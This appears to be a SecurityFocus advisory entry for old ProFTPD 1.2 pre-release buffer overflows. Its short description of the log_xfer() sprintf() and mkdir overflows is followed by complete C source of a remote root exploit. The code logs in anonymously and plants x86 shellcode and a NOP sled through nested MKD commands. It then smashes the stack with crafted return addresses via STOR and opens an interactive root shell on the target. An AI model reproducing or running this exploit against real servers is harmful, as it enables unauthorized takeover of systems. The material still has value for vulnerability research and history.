source: http://www.securityfocus.com/bid/612/info

The vulnerability in 1.2pre1, 1.2pre3 and 1.2pre3 is a remotely exploitable buffer overflow, the result of a sprintf() in the log_xfer() routine in src/log.c.
The vulnerability in 1.2pre4 is a mkdir overflow. The name of the created path can not exceed 255 chars.
1.2pre6 limits the command buffer size to 512 characters in src/main.c and modifies the fix from 1.2pre4. 

/*
* babcia padlina ltd. (poland, 17/08/99)
*
* your ultimate proftpd pre0-3 exploiting toolkit
*
* based on:
*               - adm-wuftpd by duke
*               - kombajn do czere?ni by Lam3rZ (thx for shellcode!)
*
* thx and greetz.
*/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define MAXARGLEN       64
#define MAXLINE         1024
#define ANONL           "ftp"
#define ANONP           "mozilla@"
#define INCOM           "/incoming/"
#define FTPPORT         21
#define RET             0xbffff550
#define NOP             0x90
#define ALIGN           0
#define CONTENT         "y0u ar3 n0w 0wn3d!"
#define GREEN           "\033[1;32m"
#define RED             "\033[1;31m"
#define NORM            "\033[1;39m"
#define BOLD            "\E[1m"
#define UNBOLD          "\E[m"

char *av0;
struct sockaddr_in cli;
char sendbuf[MAXLINE];

#ifdef DEBUG
FILE *phile;
#endif

long getip(name)
char *name;
{
        struct hostent *hp;
        long ip;
        extern int h_errno;

        if ((ip=inet_addr(name))==-1)
        {
                if ((hp=gethostbyname(name))==NULL)
                {
                        fprintf(stderr, "gethostbyname(): %s\n", strerror(h_errno));
                        exit(1);
                }
                memcpy(&ip, (hp->h_addr), 4);
        }
        return ip;
}

int readline(sockfd, buf)
int sockfd;
char *buf;
{
        int done = 0;
        char *n = NULL, *p = NULL, localbuff[MAXLINE];

        while (!done)
        {
                if (!p)
                {

                        int count;

                        bzero(localbuff, MAXLINE);

                        if ((count = read(sockfd, localbuff, MAXLINE)) < 0)
                        {
                                (void)fprintf(stderr, "IO error.\n");
                                return -1;
                        }
//
#ifdef DEBUG
                        fprintf(phile, "Received: %s", localbuff);
#endif
//

                        localbuff[count] = 0;
                        p = localbuff;
                }

                n=(char *)strchr(p, '\r');

                if (n)
                {
                        *n = 0;
                        n += 2;
                        done = 1;
                }

                bzero(buf, MAXLINE);

                strncat(buf, p, MAXLINE);
                p = n;
        }
        return 0;
}

int eatthis(sockfd, line)
int sockfd;
char *line;
{
        do
        {
                bzero(line, MAXLINE);
                if (readline(sockfd, line) < 0) return -1;
        } while (line[3] != ' ');

        return (int)(line[0] - '0');
}

int connecttoftp(host)
char *host;
{
        int sockfd;

        bzero(&cli, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_addr.s_addr=getip(host);
        cli.sin_port = htons(FTPPORT);

//
#ifdef DEBUG
        fprintf(phile, "Connecting to %s.\n", host);
#endif
//

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror("socket");
                return -1;
        }

        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0)
        {
                perror("connect");
                return -1;
        }

//
#ifdef DEBUG
        fprintf(phile, "Connected to %s.\n", host);
#endif
//

        return sockfd;
}

int logintoftp(sockfd, login, passwd)
int sockfd;
char *login, *passwd;
{
        int result;
        char errbuf[MAXLINE];

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "USER %s\r\n", login);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 3)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "PASS %s\r\n", passwd);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        return 0;
}

int makedir(dir, sockfd)
char *dir;
int sockfd;
{
        char buf[MAXLINE], errbuf[MAXLINE], *p;
        int n, result;

        bzero(buf, MAXLINE);
        p = buf;
        for(n=0;n < strlen(dir);n++)
        {

                if(dir[n]=='\xff')
                {
                        *p='\xff';
                        p++;
                }
                *p=dir[n];
                p++;
        }

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "MKD %s\r\n", buf);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "CWD %s\r\n", buf);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        return 0;
}

int mkd(sockfd, cwd)
int sockfd;
char *cwd;
{

        char shellcode[]=
                "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
                "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
                "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd"
                "\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb"
                "\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e"
                "\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
                "\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88"
                "\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
                "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31"
                "\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30\x62\x69\x6e"
                "\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x6e\x67\x00";

        char buf1[MAXLINE], tmp[MAXLINE], *p, *q;

        if (makedir(cwd, sockfd) < 0) return -1;

        bzero(buf1, MAXLINE);

        memset(buf1, 0x90, 756);
        memcpy(buf1, cwd, strlen(cwd));

        p = &buf1[strlen(cwd)];
        q = &buf1[755];

        bzero(tmp, MAXLINE);

        while(p <= q)
        {
                strncpy(tmp, p, 100);
                if (makedir(tmp, sockfd) < 0) return -1;
                p+=100;
        }


        if (makedir(shellcode, sockfd) < 0) return -1;
        return 0;
}

int put(sockfd, offset, align)
int sockfd, offset, align;
{
        char buf2[MAXLINE], sendbuf[MAXLINE], tmp[MAXLINE], buf[MAXLINE], hostname[MAXLINE], errbuf[MAXLINE], *p, *q;
        int n, sock, nsock, port, i;
        struct in_addr in;
        int octet_in[4], result;
        char *oct;
        struct sockaddr_in yo;

        bzero(buf2, MAXLINE);
        memset(buf2, NOP, 100);

        for(i=4-ALIGN-align; i<96; i+=4)
                *(long *)&buf2[i] = RET + offset;

        p = &buf2[0];
        q = &buf2[99];

        bzero(tmp, MAXLINE);
        strncpy(tmp, p, strlen(buf2));

        port=getpid()+1024;

        bzero(&yo, sizeof(yo));
        yo.sin_family = AF_INET;
        yo.sin_port=htons(port);

        bzero(buf, MAXLINE);
        p=buf;
        for(n=0;n<strlen(tmp);n++)
        {
                if(tmp[n]=='\xff')
                {
                        *p='\xff';
                        p++;
                }
                *p=tmp[n];
                p++;
        }

        gethostname(hostname, MAXLINE);
        in.s_addr = getip(hostname);

        oct=(char *)strtok(inet_ntoa(in),".");
        octet_in[0]=atoi(oct);
        oct=(char *)strtok(NULL,".");
        octet_in[1]=atoi(oct);
        oct=(char *)strtok(NULL,".");
        octet_in[2]=atoi(oct);
        oct=(char *)strtok(NULL,".");
        octet_in[3]=atoi(oct);

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
                perror("socket()");
                return -1;
        }

        if ((bind(sock, (struct sockaddr *) &yo, sizeof(struct sockaddr))) < 0)
        {
                perror("bind()");
                close(sock);
                return -1;
        }

        if (listen (sock,10) < 0)
        {
                perror("listen()");
                close(sock);
                return -1;
        }

        bzero(sendbuf, MAXLINE);
        sprintf(sendbuf, "STOR %s\r\n", buf);
        write(sockfd, sendbuf, strlen(sendbuf));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", sendbuf);
#endif
//

        result = eatthis(sockfd, errbuf);

        if (result < 0) return -1;
        if (result > 2)
        {
                fprintf(stderr, "%s\n", errbuf);
                return -1;
        }

        if ((nsock=accept(sock,(struct sockaddr *)&cli,(int *)sizeof(struct sockaddr))) < 0)
        {
                perror("accept()");
                close(sock);
                return -1;
        }

        write(nsock, CONTENT, sizeof(CONTENT));

//
#ifdef DEBUG
        fprintf(phile, "Sending: %s", CONTENT);
#endif
//

        close(sock);
        close(nsock);

        return 0;
}

int sh(sockfd)
int sockfd;
{
        char buf[MAXLINE];
        int c;
        fd_set rf, drugi;

        FD_ZERO(&rf);
        FD_SET(0, &rf);
        FD_SET(sockfd, &rf);

        while (1)
        {
                bzero(buf, MAXLINE);
                memcpy (&drugi, &rf, sizeof(rf));
                select(sockfd+1, &drugi, NULL, NULL, NULL);
                if (FD_ISSET(0, &drugi))
                {
                        c = read(0, buf, MAXLINE);
                        send(sockfd, buf, c, 0x4);
                }

                if (FD_ISSET(sockfd, &drugi))
                {
                        c = read(sockfd, buf, MAXLINE);
                        if (c<0) return 0;
                        write(1,buf,c);
                }
        }
}

void usage(void)
{
        (void)fprintf(stderr, "usage: %s [-l login -p passwd] [-d dir] [-o offset] [-a align] host\n", av0);
        exit(1);
}

int main(argc, argv)
int argc;
char **argv;
{
        extern int optind, opterr;
        extern char *optarg;
        int ch, aflag, oflag, lflag, pflag, dflag, offset, align, sockfd;
        char login[MAXARGLEN], passwd[MAXARGLEN], cwd[MAXLINE+1];

        (void)fprintf(stderr, "\n%sbabcia padlina ltd. proudly presents:\nyour ultimate proftpd pre0-3 exploiting toolkit%s%s\n\n", GREEN, NORM, UNBOLD);

        if (strchr(argv[0], '/'))
                av0 = strrchr(argv[0], '/') + 1;
        else
                av0 = argv[0];

        opterr = aflag = oflag = lflag = pflag = dflag = 0;

        while ((ch = getopt(argc, argv, "l:p:d:o:a:")) != -1)
                switch((char)ch)
                {
                        case 'l':
                                lflag = 1;
                                strncpy(login, optarg, MAXARGLEN);
                                break;

                        case 'p':
                                pflag = 1;
                                strncpy(passwd, optarg, MAXARGLEN);
                                break;

                        case 'd':
                                dflag = 1;
                                strncpy(cwd, optarg, MAXARGLEN);
                                break;

                        case 'o':
                                oflag = 1;
                                offset = atoi(optarg);
                                break;

                        case 'a':
                                aflag = 1;
                                align = atoi(optarg);
                                break;

                        case '?':
                        default:
                                usage();
                }

        argc -= optind;
        argv += optind;

        if (argc != 1) usage();
        if (!lflag) strncpy(login, ANONL, MAXARGLEN);
        if (!pflag) strncpy(passwd, ANONP, MAXARGLEN);
        if (!dflag) sprintf(cwd, "%s%d", INCOM, getpid());
        if (!oflag) offset = 0;
        if (!aflag) align = 0;

//
#ifdef DEBUG
        phile = fopen("debug", "w");
#endif
//

        if ((sockfd = connecttoftp(*argv)) < 0)
        {
                (void)fprintf(stderr, "Connection to %s failed.\n", *argv);
//
#ifdef DEBUG
                fclose(phile);
#endif
//
                exit(1);
        }

        (void)fprintf(stderr, "Connected to %s. Trying to log in.\n", *argv);

        if (logintoftp(sockfd, login, passwd) < 0)
        {
                (void)fprintf(stderr, "Logging in to %s (%s/%s) failed.\n", *argv, login, passwd);
//
#ifdef DEBUG
                fclose(phile);
#endif
//
                exit(1);
        }

        (void)fprintf(stderr, "Logged in as %s/%s. Preparing shellcode in %s\n", login, passwd, cwd);

        if (mkd(sockfd, cwd) < 0)
        {
                (void)fprintf(stderr, "Unknown error while making directories.\n");
//
#ifdef DEBUG
                fclose(phile);
#endif
//
                exit(1);
        }

        (void)fprintf(stderr, "RET: %x, align: %i. Smashing stack.\n", RET + offset, align);

        if (put(sockfd, offset, align) < 0)
        {
                (void)fprintf(stderr, "Unknown error while sending RETs.\n");
//
#ifdef DEBUG
                fclose(phile);
#endif
//
                exit(1);
        }

        (void)fprintf(stderr, "Y0u are n0w r00t.\n");

        if (sh(sockfd) < 0)
        {
                (void)fprintf(stderr, "Connection unexpectly terminated.\n");
//
#ifdef DEBUG
                fclose(phile);
#endif
//
                close(sockfd);
                exit(1);
        }
//
#ifdef DEBUG
        fclose(phile);
#endif
//
        exit(0);
}
